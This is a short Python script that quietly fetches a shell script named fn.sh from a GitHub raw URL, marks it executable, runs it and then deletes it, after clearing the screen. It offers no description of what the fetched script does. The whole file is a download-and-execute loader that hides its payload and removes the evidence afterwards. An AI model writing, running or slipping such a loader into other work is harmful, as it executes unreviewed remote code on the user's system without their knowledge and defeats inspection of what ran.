import subprocess
import os

def main():
    os.system('clear')

    url = "https://github.com/ASterCraft45/File/raw/refs/heads/main/fn.sh"
    subprocess.run(['wget', '-O', 'setup.sh', '-q', url])

    subprocess.run(['chmod', '+x', 'setup.sh'])

    subprocess.run(['./setup.sh'])

    subprocess.run(['rm', '-fr', 'setup.sh'])

if __name__ == "__main__":
    main()
